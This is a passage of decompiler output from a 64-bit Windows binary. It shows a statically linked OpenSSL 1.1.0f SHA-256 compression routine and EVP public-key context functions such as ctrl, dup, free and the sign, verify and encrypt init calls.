          + (v25 & v28 ^ v22 & ~v28)
          + 1508970993
          + v125
          + (__ROL4__(v28, 7) ^ __ROL4__(v28, 21) ^ __ROL4__(v28, 26));
      v31 = v30 + v20;
      v32 = v30 + (__ROL4__(v29, 10) ^ __ROL4__(v29, 19) ^ __ROL4__(v29, 30)) + (v29 & v26 ^ v23 & (v29 ^ v26));
      v126 = _byteswap_ulong(a2[6]);
      v33 = v22
          + (v31 & v28 ^ v25 & ~v31)
          - 1841331548
          + v126
          + (__ROL4__(v31, 7) ^ __ROL4__(v31, 21) ^ __ROL4__(v31, 26));
      v34 = v33 + v23;
      v35 = v33 + (__ROL4__(v32, 10) ^ __ROL4__(v32, 19) ^ __ROL4__(v32, 30)) + (v32 & v29 ^ v26 & (v32 ^ v29));
      v127 = _byteswap_ulong(a2[7]);
      v36 = v25
          + (v34 & v31 ^ v28 & ~v34)
          - 1424204075
          + v127
          + (__ROL4__(v34, 7) ^ __ROL4__(v34, 21) ^ __ROL4__(v34, 26));
      v37 = v36 + v26;
      v38 = v36 + (__ROL4__(v35, 10) ^ __ROL4__(v35, 19) ^ __ROL4__(v35, 30)) + (v35 & v32 ^ v29 & (v35 ^ v32));
      v128 = _byteswap_ulong(a2[8]);
      v39 = v28
          + (v37 & v34 ^ v31 & ~v37)
          - 670586216
          + v128
          + (__ROL4__(v37, 7) ^ __ROL4__(v37, 21) ^ __ROL4__(v37, 26));
      v40 = v39 + v29;
      v93 = v39 + (__ROL4__(v38, 19) ^ __ROL4__(v38, 30) ^ __ROL4__(v38, 10)) + (v38 & v35 ^ v32 & (v38 ^ v35));
      v129 = _byteswap_ulong(a2[9]);
      v41 = v31
          + (v40 & v37 ^ v34 & ~v40)
          + 310598401
          + v129
          + (__ROL4__(v40, 7) ^ __ROL4__(v40, 21) ^ __ROL4__(v40, 26));
      v42 = v41 + v32;
      v43 = v41 + (__ROL4__(v93, 19) ^ __ROL4__(v93, 30) ^ __ROL4__(v93, 10)) + (v38 & v35 ^ v93 & (v38 ^ v35));
      v130 = _byteswap_ulong(a2[10]);
      v44 = v34
          + (v42 & v40 ^ v37 & ~v42)
          + 607225278
          + (__ROL4__(v42, 7) ^ __ROL4__(v42, 21) ^ __ROL4__(v42, 26))
          + v130;
      v45 = v44 + v35;
      v46 = v44 + (__ROL4__(v43, 10) ^ __ROL4__(v43, 19) ^ __ROL4__(v43, 30)) + (v38 & v43 ^ v93 & (v38 ^ v43));
      v116 = a2 + 12;
      v131 = _byteswap_ulong(a2[11]);
      v47 = v131
          + (__ROL4__(v45, 7) ^ __ROL4__(v45, 21) ^ __ROL4__(v45, 26))
          + (v45 & v42 ^ v40 & ~v45)
          + v37
          + 1426881987;
      v48 = v47 + v38;
      v49 = v47 + (__ROL4__(v46, 10) ^ __ROL4__(v46, 19) ^ __ROL4__(v46, 30)) + (v46 & v43 ^ v93 & (v46 ^ v43));
      v132 = _byteswap_ulong(*v116);
      v50 = v40
          + (v48 & v45 ^ v42 & ~v48)
          + 1925078388
          + v132
          + (__ROL4__(v48, 7) ^ __ROL4__(v48, 21) ^ __ROL4__(v48, 26));
      v94 = v50 + v93;
      v51 = v50 + (__ROL4__(v49, 10) ^ __ROL4__(v49, 19) ^ __ROL4__(v49, 30)) + (v49 & v46 ^ v43 & (v49 ^ v46));
      v52 = _byteswap_ulong(v116[1]);
      v116 += 2;
      v133 = v52;
      v53 = v52
          + (__ROL4__(v94, 7) ^ __ROL4__(v94, 21) ^ __ROL4__(v94, 26))
          + (v48 & v94 ^ v45 & ~v94)
          + v42
          - 2132889090;
      v96 = v53 + v43;
      v54 = v53 + (__ROL4__(v51, 10) ^ __ROL4__(v51, 19) ^ __ROL4__(v51, 30)) + (v51 & v49 ^ v46 & (v51 ^ v49));
      v98 = v54;
      v134 = _byteswap_ulong(*v116);
      v55 = v45
          + (v96 & v94 ^ v48 & ~v96)
          - 1680079193
          + v134
          + (__ROL4__(v53 + v43, 7) ^ __ROL4__(v53 + v43, 21) ^ __ROL4__(v53 + v43, 26));
      v56 = v55 + v46;
      v57 = v55 + (__ROL4__(v54, 10) ^ __ROL4__(v54, 19) ^ __ROL4__(v54, 30)) + (v54 & v51 ^ v49 & (v54 ^ v51));
      v102 = v57;
      v58 = _byteswap_ulong(v116[1]);
      v117 = v116 + 2;
      v135 = v58;
      v59 = v58
          + (__ROL4__(v56, 7) ^ __ROL4__(v56, 21) ^ __ROL4__(v56, 26))
          + (v56 & v96 ^ v94 & ~v56)
          + v48
          - 1046744716;
      v60 = v59 + v49;
      v61 = 14;
      v104 = 14;
      v62 = v59 + (__ROL4__(v57, 10) ^ __ROL4__(v57, 19) ^ __ROL4__(v57, 30)) + (v57 & v54 ^ v51 & (v57 ^ v54));
      v105 = &unk_1400D75D8;
      v100 = v62;
      while ( 1 )
      {
        v63 = (int *)(&v120 + ((v61 + 3) & 0xF));
        v64 = (int *)(&v120 + (v61 & 0xF));
        v65 = (int *)(&v120 + ((v61 + 2) & 0xF));
        v66 = (v61 - 5) & 0xF;
        v67 = v62 ^ v57;
        v68 = v62 & v57;
        *v65 += *(&v120 + v66)
              + (((unsigned int)*v63 >> 3) ^ __ROL4__(*v63, 14) ^ __ROL4__(*v63, 25))
              + (((unsigned int)*v64 >> 10) ^ __ROL4__(*v64, 13) ^ __ROL4__(*v64, 15));
        v69 = v94
            + *v65
            + *(v105 - 2)
            + (v60 & v56 ^ v96 & ~v60)
            + (__ROL4__(v60, 7) ^ __ROL4__(v60, 21) ^ __ROL4__(v60, 26));
        v106 = v69 + v51;
        v95 = v69 + (__ROL4__(v62, 19) ^ __ROL4__(v62, 30) ^ __ROL4__(v62, 10)) + (v68 ^ v54 & v67);
        v70 = (int *)(&v120 + (((_BYTE)v104 + 4) & 0xF));
        v71 = *(&v120 + (((_BYTE)v104 + 1) & 0xF));
        *v63 += *(&v120 + (((_BYTE)v104 - 4) & 0xF))
              + (((unsigned int)*v70 >> 3) ^ __ROL4__(*v70, 14) ^ __ROL4__(*v70, 25))
              + ((v71 >> 10) ^ __ROL4__(v71, 13) ^ __ROL4__(v71, 15));
        v72 = v96
            + *v63
            + *(v105 - 1)
            + (v106 & v60 ^ v56 & ~v106)
            + (__ROL4__(v106, 7) ^ __ROL4__(v106, 21) ^ __ROL4__(v106, 26));
        v99 = v72 + v98;
        v97 = v72 + (__ROL4__(v95, 19) ^ __ROL4__(v95, 30) ^ __ROL4__(v95, 10)) + (v68 ^ v95 & v67);
        v73 = (int *)(&v120 + (((_BYTE)v104 + 5) & 0xF));
        *v70 += *(&v120 + (((_BYTE)v104 - 3) & 0xF))
              + (((unsigned int)*v73 >> 3) ^ __ROL4__(*v73, 14) ^ __ROL4__(*v73, 25))
              + (((unsigned int)*v65 >> 10) ^ __ROL4__(*v65, 13) ^ __ROL4__(*v65, 15));
        v74 = v56
            + *v70
            + *v105
            + (v99 & v106 ^ v60 & ~v99)
            + (__ROL4__(v99, 7) ^ __ROL4__(v99, 21) ^ __ROL4__(v99, 26));
        v103 = v74 + v102;
        v75 = v74 + (__ROL4__(v97, 10) ^ __ROL4__(v97, 19) ^ __ROL4__(v97, 30)) + (v100 & v97 ^ v95 & (v100 ^ v97));
        v76 = (int *)(&v120 + (((_BYTE)v104 + 6) & 0xF));
        *v73 += *(&v120 + (((_BYTE)v104 - 2) & 0xF))
              + (((unsigned int)*v76 >> 3) ^ __ROL4__(*v76, 14) ^ __ROL4__(*v76, 25))
              + (((unsigned int)*v63 >> 10) ^ __ROL4__(*v63, 13) ^ __ROL4__(*v63, 15));
        v77 = v60
            + *v73
            + v105[1]
            + (v103 & v99 ^ v106 & ~v103)
            + (__ROL4__(v103, 7) ^ __ROL4__(v103, 21) ^ __ROL4__(v103, 26));
        v101 = v77 + v100;
        v78 = v77 + (__ROL4__(v75, 10) ^ __ROL4__(v75, 19) ^ __ROL4__(v75, 30)) + (v75 & v97 ^ v95 & (v75 ^ v97));
        v79 = (int *)(&v120 + (((_BYTE)v104 + 7) & 0xF));
        *v76 += *(&v120 + (((_BYTE)v104 - 1) & 0xF))
              + (((unsigned int)*v79 >> 3) ^ __ROL4__(*v79, 14) ^ __ROL4__(*v79, 25))
              + (((unsigned int)*v70 >> 10) ^ __ROL4__(*v70, 13) ^ __ROL4__(*v70, 15));
        v80 = v106
            + *v76
            + v105[2]
            + (v101 & v103 ^ v99 & ~v101)
            + (__ROL4__(v101, 7) ^ __ROL4__(v101, 21) ^ __ROL4__(v101, 26));
        v94 = v80 + v95;
        v107 = v80 + (__ROL4__(v78, 10) ^ __ROL4__(v78, 19) ^ __ROL4__(v78, 30)) + (v78 & v75 ^ v97 & (v78 ^ v75));
        v81 = (int *)(&v120 + (((_BYTE)v104 + 8) & 0xF));
        *v79 += *v64
              + (((unsigned int)*v81 >> 3) ^ __ROL4__(*v81, 14) ^ __ROL4__(*v81, 25))
              + (((unsigned int)*v73 >> 10) ^ __ROL4__(*v73, 13) ^ __ROL4__(*v73, 15));
        v82 = v99
            + *v79
            + v105[3]
            + (v101 & v94 ^ v103 & ~v94)
            + (__ROL4__(v94, 7) ^ __ROL4__(v94, 21) ^ __ROL4__(v94, 26));
        v96 = v82 + v97;
        v83 = *v76;
        v84 = v82 + (__ROL4__(v107, 10) ^ __ROL4__(v107, 19) ^ __ROL4__(v107, 30)) + (v107 & v78 ^ v75 & (v107 ^ v78));
        v85 = __ROL4__(*v76, 15);
        v98 = v84;
        v86 = (int *)(&v120 + (((_BYTE)v104 - 7) & 0xF));
        v51 = v107;
        *v81 += *(&v120 + (((_BYTE)v104 + 1) & 0xF))
              + (((unsigned int)*v86 >> 3) ^ __ROL4__(*v86, 14) ^ __ROL4__(*v86, 25))
              + ((v83 >> 10) ^ __ROL4__(v83, 13) ^ v85);
        v87 = v103
            + *v81
            + v105[4]
            + (v96 & v94 ^ v101 & ~v96)
            + (__ROL4__(v96, 7) ^ __ROL4__(v96, 21) ^ __ROL4__(v96, 26));
        v56 = v87 + v75;
        v57 = v87 + (__ROL4__(v84, 10) ^ __ROL4__(v84, 19) ^ __ROL4__(v84, 30)) + (v84 & v51 ^ v78 & (v84 ^ v51));
        v102 = v57;
        v88 = *(&v120 + (((_BYTE)v104 - 6) & 0xF));
        *v86 += *v65
              + ((v88 >> 3) ^ __ROL4__(v88, 14) ^ __ROL4__(v88, 25))
              + (((unsigned int)*v79 >> 10) ^ __ROL4__(*v79, 13) ^ __ROL4__(*v79, 15));
        v89 = v105;
        v105 += 8;
        v90 = *v86 + v89[5] + (v56 & v96 ^ v94 & ~v56) + (__ROL4__(v56, 7) ^ __ROL4__(v56, 21) ^ __ROL4__(v56, 26));
        v61 = v104 + 8;
        v91 = v101 + v90;
        v60 = v91 + v78;
        v104 += 8;
        v92 = v91 + (__ROL4__(v57, 10) ^ __ROL4__(v57, 19) ^ __ROL4__(v57, 30)) + (v57 & v84 ^ v107 & (v57 ^ v84));
        v100 = v92;
        if ( v104 + 2 >= 64 )
          break;
        v54 = v84;
        v62 = v92;
      }
      v8 = v92 + v109;
      v5 = v84 + v110;
      v3 = v57 + v108;
      v12 = v96 + v114;
      v7 = v107 + v111;
      v11 = v60 + v112;
      v9 = v56 + v113;
      v4 = v119;
      v10 = v94 + v115;
      a2 = v117;
      v109 = v8;
      *a1 = v8;
      v108 = v3;
      a1[1] = v3;
      v110 = v5;
      a1[2] = v5;
      v111 = v7;
      a1[3] = v7;
      v112 = v11;
      a1[4] = v11;
      v113 = v9;
      a1[5] = v9;
      v114 = v12;
      a1[6] = v12;
      v115 = v10;
      a1[7] = v10;
    }
    while ( v119 );
  }
}

//----- (0000000140020440) ----------------------------------------------------
__int64 __fastcall sub_140020440(__int64 *a1, int a2, int a3, unsigned int a4, unsigned int a5, __int64 a6)
{
  __int64 v6; // rax
  __int64 (__fastcall *v7)(__int64 *, _QWORD, _QWORD, __int64); // r10
  int v8; // eax
  unsigned int v10; // ebx

  if ( a1 && (v6 = *a1) != 0 && (v7 = *(__int64 (__fastcall **)(__int64 *, _QWORD, _QWORD, __int64))(v6 + 192)) != 0i64 )
  {
    if ( a2 != -1 && *(_DWORD *)v6 != a2 )
      return 0xFFFFFFFFi64;
    v8 = *((_DWORD *)a1 + 8);
    if ( !v8 )
    {
      sub_140024610(6, 137, 149, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_lib.c", 307);
      return 0xFFFFFFFFi64;
    }
    if ( a3 == -1 || (v8 & a3) != 0 )
    {
      v10 = v7(a1, a4, a5, a6);
      if ( v10 == -2 )
        sub_140024610(6, 137, 147, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_lib.c", 319);
      return v10;
    }
    else
    {
      sub_140024610(6, 137, 148, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_lib.c", 312);
      return 0xFFFFFFFFi64;
    }
  }
  else
  {
    sub_140024610(6, 137, 147, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_lib.c", 300);
    return 4294967294i64;
  }
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140020560) ----------------------------------------------------
_QWORD *__fastcall sub_140020560(__int64 a1)
{
  __int64 v2; // rcx
  _QWORD *v4; // rax
  _QWORD *v5; // rbx
  __int64 v6; // rcx
  __int64 v7; // rcx

  if ( !*(_QWORD *)a1 || !*(_QWORD *)(*(_QWORD *)a1 + 16i64) )
    return 0i64;
  v2 = *(_QWORD *)(a1 + 8);
  if ( v2 && !(unsigned int)sub_140025980(v2) )
  {
    sub_140024610(6, 156, 38, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_lib.c", 232);
    return 0i64;
  }
  v4 = sub_14001D8E0(0x50ui64);
  v5 = v4;
  if ( v4 )
  {
    *v4 = *(_QWORD *)a1;
    v4[1] = *(_QWORD *)(a1 + 8);
    v6 = *(_QWORD *)(a1 + 16);
    if ( v6 )
      sub_14001D790(v6);
    v5[2] = *(_QWORD *)(a1 + 16);
    v7 = *(_QWORD *)(a1 + 24);
    if ( v7 )
      sub_14001D790(v7);
    v5[3] = *(_QWORD *)(a1 + 24);
    v5[5] = 0i64;
    v5[6] = 0i64;
    *((_DWORD *)v5 + 8) = *(_DWORD *)(a1 + 32);
    if ( (*(int (__fastcall **)(_QWORD *, __int64))(*(_QWORD *)a1 + 16i64))(v5, a1) > 0 )
      return v5;
    *v5 = 0i64;
    sub_140020670(v5);
  }
  return 0i64;
}

//----- (0000000140020670) ----------------------------------------------------
void __fastcall sub_140020670(_QWORD *a1)
{
  void (*v2)(void); // rdx

  if ( a1 )
  {
    if ( *a1 )
    {
      v2 = *(void (**)(void))(*a1 + 24i64);
      if ( v2 )
        v2();
    }
    sub_14001D3C0(a1[2]);
    sub_14001D3C0(a1[3]);
    sub_140025890(a1[1]);
    sub_14001D930(a1);
  }
}
// 140025890: using guessed type __int64 __fastcall sub_140025890(_QWORD);

//----- (00000001400206E0) ----------------------------------------------------
void *__fastcall sub_1400206E0(__int64 a1, unsigned int a2, char *a3)
{
  void *result; // rax
  void *v6; // rdi
  unsigned int v7; // ebx
  unsigned int v8; // [rsp+48h] [rbp+20h] BYREF

  result = sub_14003BE60(a3, &v8);
  v6 = result;
  if ( result )
  {
    v7 = (*(__int64 (__fastcall **)(__int64, _QWORD, _QWORD, void *))(*(_QWORD *)a1 + 192i64))(a1, a2, v8, result);
    sub_14001D930(v6);
    return (void *)v7;
  }
  return result;
}

//----- (0000000140020770) ----------------------------------------------------
_QWORD *__fastcall sub_140020770(__int64 a1, __int64 a2)
{
  return sub_1400208E0(a1, a2, 0xFFFFFFFF);
}

//----- (0000000140020790) ----------------------------------------------------
_QWORD *__fastcall sub_140020790(unsigned int a1, __int64 a2)
{
  return sub_1400208E0(0i64, a2, a1);
}

//----- (00000001400207C0) ----------------------------------------------------
__int64 __fastcall sub_1400207C0(__int64 a1, __int64 a2, _BYTE *a3)
{
  unsigned int v3; // eax
  _BYTE *i; // r9

  v3 = 0;
  for ( i = a3; *i; ++v3 )
  {
    if ( v3 >= 0x80000000 )
      break;
    ++i;
  }
  return (*(__int64 (__fastcall **)(__int64, __int64, _QWORD, _BYTE *))(*(_QWORD *)a1 + 192i64))(
           a1,
           a2,
           v3 & 0x7FFFFFFF,
           a3);
}
// 1400207FF: conditional instruction was optimized away because rcx.8<80000000u

//----- (0000000140020820) ----------------------------------------------------
__int64 __fastcall sub_140020820(int a1)
{
  int v1; // eax
  __int64 result; // rax
  __int64 *v3; // rax
  int v4[54]; // [rsp+30h] [rbp-D8h] BYREF
  int *v5; // [rsp+118h] [rbp+10h] BYREF

  v4[0] = a1;
  v5 = v4;
  if ( qword_140140960 )
  {
    v1 = sub_140029490((int *)qword_140140960, (__int64)v4);
    if ( v1 >= 0 )
      return sub_140029880(qword_140140960, v1);
  }
  v3 = (__int64 *)sub_14002BCB0(
                    (__int64)&v5,
                    (__int64)&off_140134A60,
                    10,
                    8,
                    (__int64 (__fastcall *)(__int64, __int64))sub_140020A60);
  if ( !v3 )
    return 0i64;
  result = *v3;
  if ( !result )
    return 0i64;
  return result;
}
// 140134A60: using guessed type void *off_140134A60;
// 140140960: using guessed type __int64 qword_140140960;

//----- (00000001400208B0) ----------------------------------------------------
void __fastcall sub_1400208B0(_BYTE *a1)
{
  if ( a1 )
  {
    if ( (a1[4] & 1) != 0 )
      sub_14001D930(a1);
  }
}

//----- (00000001400208E0) ----------------------------------------------------
_QWORD *__fastcall sub_1400208E0(__int64 a1, __int64 a2, unsigned int a3)
{
  unsigned int v3; // edi
  unsigned int *v6; // rax
  __int64 v8; // rax
  __int64 v9; // rbp
  _QWORD *v10; // rax
  _QWORD *v11; // rdi
  int (__fastcall *v12)(_QWORD *); // rax

  v3 = a3;
  if ( a3 == -1 )
  {
    if ( !a1 )
      return 0i64;
    v6 = *(unsigned int **)(a1 + 16);
    if ( !v6 )
      return 0i64;
    v3 = *v6;
  }
  if ( a1 && *(_QWORD *)(a1 + 24) )
    a2 = *(_QWORD *)(a1 + 24);
  if ( a2 )
  {
    if ( !(unsigned int)sub_140025980(a2) )
    {
      sub_140024610(6, 157, 38, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_lib.c", 97);
      return 0i64;
    }
  }
  else
  {
    a2 = sub_14003C170(v3);
  }
  if ( a2 )
    v8 = sub_14003C110(a2, v3);
  else
    v8 = sub_140020820(v3);
  v9 = v8;
  if ( v8 )
  {
    v10 = sub_14001DC20(0x50ui64);
    v11 = v10;
    if ( v10 )
    {
      v10[1] = a2;
      *v10 = v9;
      *((_DWORD *)v10 + 8) = 0;
      v10[2] = a1;
      if ( a1 )
        sub_14001D790(a1);
      v12 = *(int (__fastcall **)(_QWORD *))(v9 + 8);
      if ( v12 && v12(v11) <= 0 )
      {
        *v11 = 0i64;
        sub_140020670(v11);
        return 0i64;
      }
      else
      {
        return v11;
      }
    }
    else
    {
      sub_140025890(a2);
      sub_140024610(6, 157, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_lib.c", 124);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(6, 157, 156, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_lib.c", 115);
    return 0i64;
  }
}

//----- (0000000140020A60) ----------------------------------------------------
__int64 __fastcall sub_140020A60(_DWORD **a1, _DWORD **a2)
{
  return (unsigned int)(**a1 - **a2);
}

//----- (0000000140020A70) ----------------------------------------------------
__int64 __fastcall sub_140020A70(__int64 *a1, __int64 a2, _QWORD *a3)
{
  __int64 v6; // rax
  int v8; // eax

  if ( a1 && (v6 = *a1) != 0 && *(_QWORD *)(v6 + 184) )
  {
    if ( *((_DWORD *)a1 + 8) != 1024 )
    {
      sub_140024610(6, 153, 151, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_fn.c", 292);
      return 0xFFFFFFFFi64;
    }
    if ( (*(_BYTE *)(v6 + 4) & 2) == 0 )
      return (*(__int64 (__fastcall **)(__int64 *, __int64, _QWORD *))(*a1 + 184))(a1, a2, a3);
    v8 = sub_14001D700(a1[2]);
    if ( !v8 )
    {
      sub_140024610(6, 153, 163, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_fn.c", 295);
      return 0i64;
    }
    if ( !a2 )
    {
      *a3 = v8;
      return 1i64;
    }
    if ( *a3 < (unsigned __int64)v8 )
    {
      sub_140024610(6, 153, 155, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_fn.c", 295);
      return 0i64;
    }
    else
    {
      return (*(__int64 (__fastcall **)(__int64 *, __int64, _QWORD *))(*a1 + 184))(a1, a2, a3);
    }
  }
  else
  {
    sub_140024610(6, 153, 150, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_fn.c", 288);
    return 4294967294i64;
  }
}

//----- (0000000140020BF0) ----------------------------------------------------
__int64 __fastcall sub_140020BF0(__int64 *a1)
{
  __int64 v2; // rax
  __int64 (*v3)(void); // rdx
  __int64 result; // rax

  if ( a1 && (v2 = *a1) != 0 && *(_QWORD *)(v2 + 184) )
  {
    *((_DWORD *)a1 + 8) = 1024;
    v3 = *(__int64 (**)(void))(v2 + 176);
    if ( v3 )
    {
      result = v3();
      if ( (int)result <= 0 )
        *((_DWORD *)a1 + 8) = 0;
    }
    else
    {
      return 1i64;
    }
  }
  else
  {
    sub_140024610(6, 154, 150, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_fn.c", 209);
    return 4294967294i64;
  }
  return result;
}

//----- (0000000140020C80) ----------------------------------------------------
__int64 __fastcall sub_140020C80(__int64 a1, _DWORD *a2)
{
  _QWORD *v4; // rax
  __int64 (__fastcall *v5)(__int64, __int64, _QWORD, _DWORD *); // r10
  int v6; // ecx
  __int64 result; // rax
  _DWORD *v8; // rcx
  _QWORD *v9; // rax

  if ( a1
    && (v4 = *(_QWORD **)a1) != 0i64
    && (v4[23] || v4[19] || v4[21])
    && (v5 = (__int64 (__fastcall *)(__int64, __int64, _QWORD, _DWORD *))v4[24]) != 0i64 )
  {
    v6 = *(_DWORD *)(a1 + 32);
    if ( ((v6 - 256) & 0xFFFFFCFF) != 0 || v6 == 768 )
    {
      sub_140024610(6, 155, 151, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_fn.c", 235);
      return 0xFFFFFFFFi64;
    }
    else
    {
      result = v5(a1, 2i64, 0i64, a2);
      if ( (int)result <= 0 )
        return result;
      if ( (_DWORD)result != 2 )
      {
        v8 = *(_DWORD **)(a1 + 16);
        if ( !v8 )
        {
          sub_140024610(6, 155, 154, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_fn.c", 248);
          return 0xFFFFFFFFi64;
        }
        if ( *v8 != *a2 )
        {
          sub_140024610(6, 155, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_fn.c", 253);
          return 0xFFFFFFFFi64;
        }
        if ( !(unsigned int)sub_14001D500((__int64)a2) && !(unsigned int)sub_14001D240(*(_QWORD *)(a1 + 16), a2) )
        {
          sub_140024610(6, 155, 153, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_fn.c", 266);
          return 0xFFFFFFFFi64;
        }
        sub_14001D3C0(*(_QWORD *)(a1 + 24));
        v9 = *(_QWORD **)a1;
        *(_QWORD *)(a1 + 24) = a2;
        result = ((__int64 (__fastcall *)(__int64, __int64, __int64, _DWORD *))v9[24])(a1, 2i64, 1i64, a2);
        if ( (int)result <= 0 )
        {
          *(_QWORD *)(a1 + 24) = 0i64;
          return result;
        }
        sub_14001D790((__int64)a2);
      }
      return 1i64;
    }
  }
  else
  {
    sub_140024610(6, 155, 150, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_fn.c", 228);
    return 4294967294i64;
  }
}

//----- (0000000140020E90) ----------------------------------------------------
__int64 __fastcall sub_140020E90(__int64 *a1, __int64 a2, _QWORD *a3, __int64 a4, __int64 a5)
{
  __int64 v9; // rax
  int v11; // eax

  if ( a1 && (v9 = *a1) != 0 && *(_QWORD *)(v9 + 152) )
  {
    if ( *((_DWORD *)a1 + 8) != 256 )
    {
      sub_140024610(6, 105, 151, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_fn.c", 163);
      return 0xFFFFFFFFi64;
    }
    if ( (*(_BYTE *)(v9 + 4) & 2) == 0 )
      return (*(__int64 (__fastcall **)(__int64 *, __int64, _QWORD *, __int64, __int64))(*a1 + 152))(a1, a2, a3, a4, a5);
    v11 = sub_14001D700(a1[2]);
    if ( !v11 )
    {
      sub_140024610(6, 105, 163, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_fn.c", 166);
      return 0i64;
    }
    if ( !a2 )
    {
      *a3 = v11;
      return 1i64;
    }
    if ( *a3 < (unsigned __int64)v11 )
    {
      sub_140024610(6, 105, 155, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_fn.c", 166);
      return 0i64;
    }
    else
    {
      return (*(__int64 (__fastcall **)(__int64 *, __int64, _QWORD *, __int64, __int64))(*a1 + 152))(a1, a2, a3, a4, a5);
    }
  }
  else
  {
    sub_140024610(6, 105, 150, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_fn.c", 159);
    return 4294967294i64;
  }
}

//----- (0000000140020FE0) ----------------------------------------------------
__int64 __fastcall sub_140020FE0(__int64 *a1)
{
  __int64 v2; // rax
  __int64 (*v3)(void); // rdx
  __int64 result; // rax

  if ( a1 && (v2 = *a1) != 0 && *(_QWORD *)(v2 + 152) )
  {
    *((_DWORD *)a1 + 8) = 256;
    v3 = *(__int64 (**)(void))(v2 + 144);
    if ( v3 )
    {
      result = v3();
      if ( (int)result <= 0 )
        *((_DWORD *)a1 + 8) = 0;
    }
    else
    {
      return 1i64;
    }
  }
  else
  {
    sub_140024610(6, 139, 150, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_fn.c", 141);
    return 4294967294i64;
  }
  return result;
}

//----- (0000000140021070) ----------------------------------------------------
__int64 __fastcall sub_140021070(__int64 *a1, __int64 a2, _QWORD *a3, __int64 a4, __int64 a5)
{
  __int64 v9; // rax
  int v11; // eax

  if ( a1 && (v9 = *a1) != 0 && *(_QWORD *)(v9 + 72) )
  {
    if ( *((_DWORD *)a1 + 8) != 8 )
    {
      sub_140024610(6, 140, 151, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_fn.c", 62);
      return 0xFFFFFFFFi64;
    }
    if ( (*(_BYTE *)(v9 + 4) & 2) == 0 )
      return (*(__int64 (__fastcall **)(__int64 *, __int64, _QWORD *, __int64, __int64))(*a1 + 72))(a1, a2, a3, a4, a5);
    v11 = sub_14001D700(a1[2]);
    if ( !v11 )
    {
      sub_140024610(6, 140, 163, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_fn.c", 65);
      return 0i64;
    }
    if ( !a2 )
    {
      *a3 = v11;
      return 1i64;
    }
    if ( *a3 < (unsigned __int64)v11 )
    {
      sub_140024610(6, 140, 155, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_fn.c", 65);
      return 0i64;
    }
    else
    {
      return (*(__int64 (__fastcall **)(__int64 *, __int64, _QWORD *, __int64, __int64))(*a1 + 72))(a1, a2, a3, a4, a5);
    }
  }
  else
  {
    sub_140024610(6, 140, 150, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_fn.c", 58);
    return 4294967294i64;
  }
}

//----- (00000001400211C0) ----------------------------------------------------
__int64 __fastcall sub_1400211C0(__int64 *a1)
{
  __int64 v2; // rax
  __int64 (*v3)(void); // rdx
  __int64 result; // rax

  if ( a1 && (v2 = *a1) != 0 && *(_QWORD *)(v2 + 72) )
  {
    *((_DWORD *)a1 + 8) = 8;
    v3 = *(__int64 (**)(void))(v2 + 64);
    if ( v3 )
    {
      result = v3();
      if ( (int)result <= 0 )
        *((_DWORD *)a1 + 8) = 0;
    }
    else
    {
      return 1i64;
    }
  }
  else
  {
    sub_140024610(6, 141, 150, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_fn.c", 40);
    return 4294967294i64;
  }
  return result;
}

//----- (0000000140021240) ----------------------------------------------------
__int64 __fastcall sub_140021240(_DWORD *a1)
{
  __int64 (*v1)(void); // r10

  if ( a1 && *(_QWORD *)a1 && (v1 = *(__int64 (**)(void))(*(_QWORD *)a1 + 88i64)) != 0i64 )
  {
    if ( a1[8] == 16 )
    {
      return v1();
    }
    else
    {
      sub_140024610(6, 142, 151, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_fn.c", 96);
      return 0xFFFFFFFFi64;
    }
  }
  else
  {
    sub_140024610(6, 142, 150, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_fn.c", 92);
    return 4294967294i64;
  }
}

//----- (00000001400212D0) ----------------------------------------------------
__int64 __fastcall sub_1400212D0(__int64 *a1)
{
  __int64 v2; // rax
  __int64 (*v3)(void); // rdx
  __int64 result; // rax

  if ( a1 && (v2 = *a1) != 0 && *(_QWORD *)(v2 + 88) )
  {
    *((_DWORD *)a1 + 8) = 16;
    v3 = *(__int64 (**)(void))(v2 + 80);
    if ( v3 )
    {
      result = v3();
      if ( (int)result <= 0 )
        *((_DWORD *)a1 + 8) = 0;
    }
    else
    {
      return 1i64;
    }
  }
  else
  {
    sub_140024610(6, 143, 150, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_fn.c", 74);
